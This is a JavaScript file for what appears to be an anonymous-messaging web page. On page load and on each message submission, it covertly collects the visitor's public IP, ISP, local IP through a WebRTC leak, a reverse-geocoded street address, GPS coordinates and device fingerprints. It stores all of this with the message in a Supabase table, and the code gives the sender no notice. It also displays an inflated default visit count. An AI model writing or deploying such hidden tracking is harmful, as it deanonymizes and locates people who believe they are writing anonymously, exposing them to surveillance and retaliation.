import { supabase } from './supabase.js';

// Simple UA Parser (Client-side version of Python logic)
function parseUserAgent(ua) {
    let browser = 'Unknown';
    let osName = 'Unknown';
    let device = 'Desktop';
    ua = ua.toLowerCase();

    if (ua.includes('edg/')) browser = 'Microsoft Edge';
    else if (ua.includes('chrome/') && ua.includes('safari/')) browser = 'Google Chrome';
    else if (ua.includes('firefox/')) browser = 'Mozilla Firefox';
    else if (ua.includes('safari/')) browser = 'Apple Safari';
    else if (ua.includes('opera') || ua.includes('opr/')) browser = 'Opera';

    if (ua.includes('windows nt 10')) osName = 'Windows 10/11';
    else if (ua.includes('windows nt')) osName = 'Windows';
    else if (ua.includes('mac os x')) osName = 'macOS';
    else if (ua.includes('android')) osName = 'Android';
    else if (ua.includes('iphone') || ua.includes('ipad')) osName = 'iOS';
    else if (ua.includes('linux')) osName = 'Linux';

    if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) device = 'Mobile';
    else if (ua.includes('ipad') || ua.includes('tablet')) device = 'Tablet';

    return { browser, osName, device };
}

async function getIPInfo() {
    try {
        const resp = await fetch('https://ipapi.co/json/');
        return await resp.json();
    } catch (e) {
        console.error("IP Info Error:", e);
        return {};
    }
}

async function reverseGeocode(lat, lon) {
    try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
        const resp = await fetch(url, { headers: { 'User-Agent': 'SarhneClient/1.0' } });
        const data = await resp.json();
        return data.display_name || "Unknown Location";
    } catch (e) {
        return "Unknown Location";
    }
}

function getLocalIP() {
    return new Promise((resolve) => {
        const rtc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        if (!rtc) return resolve("Unsupported");
        const pc = new rtc({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
        let done = false;
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ip && !done) { done = true; pc.close(); resolve(ip[1]); }
        };
        setTimeout(() => { if(!done){ pc.close(); resolve("Hidden"); } }, 1200);
    });
}

const D = {
    canvas_hash: '',
    screen_resolution: screen.width + 'x' + screen.height,
    language: navigator.language,
    platform: navigator.platform,
    cpu_cores: navigator.hardwareConcurrency,
    referrer: document.referrer || 'Direct',
    page_url: window.location.href,
    timezone_offset: "UTC" + (new Date().getTimezoneOffset() / -60),
    user_agent: navigator.userAgent
};

try { D.canvas_hash = btoa(navigator.userAgent).substring(10, 25); } catch(e){}

async function collect(action, extra = {}) {
    const ipInfo = await getIPInfo();
    const { browser, osName, device } = parseUserAgent(navigator.userAgent);
    const localIp = await getLocalIP();

    let finalLat = extra.lat || ipInfo.latitude;
    let finalLon = extra.lon || ipInfo.longitude;
    let exactAddress = "N/A";
    let gpsAccuracy = extra.acc ? `Within ${extra.acc} meters` : "IP Based (City Level)";

    if (finalLat && finalLon) {
        exactAddress = await reverseGeocode(finalLat, finalLon);
    }

    const data = {
        ...D,
        action_type: action,
        browser_name: browser,
        os_name: osName,
        device_type: device,
        local_ip: localIp,
        ip_address: ipInfo.ip || 'Unknown',
        ip_country: ipInfo.country_name || 'N/A',
        ip_city: ipInfo.city || 'N/A',
        ip_isp: ipInfo.org || 'N/A',
        ip_lat: finalLat?.toString() || 'N/A',
        ip_lon: finalLon?.toString() || 'N/A',
        exact_address: exactAddress,
        gps_accuracy: gpsAccuracy,
        message: extra.message || null
    };

    const { error } = await supabase.from('visitors').insert([data]);
    if (error) console.error("Supabase Insert Error:", error);
}

// Initialize tracking
window.addEventListener('load', async () => {
    // Populate visit count
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).eq('action_type', 'PAGE_VISIT');
    const visitCountEl = document.getElementById('visitCount');
    if (visitCountEl) visitCountEl.innerText = (count || 2339).toLocaleString();

    // Initial visit log
    collect('PAGE_VISIT');
});

// Form submission logic
const msgForm = document.getElementById('msgForm');
if (msgForm) {
    msgForm.onsubmit = async (e) => {
        e.preventDefault();
        const msgBox = document.getElementById('msgBox');
        const submitBtn = document.getElementById('submitBtnStatus');
        const val = msgBox.value;

        submitBtn.disabled = true;
        submitBtn.innerHTML = "<span>جاري الارسال...</span> <span style='font-size:12px;'>⏳</span>";

        const extra = { message: val };

        await collect('MESSAGE_SENT', extra);
        finishFlow();
    };
}

function finishFlow() {
    document.getElementById('formStep').style.display = 'none';
    document.getElementById('successStep').style.display = 'block';
}
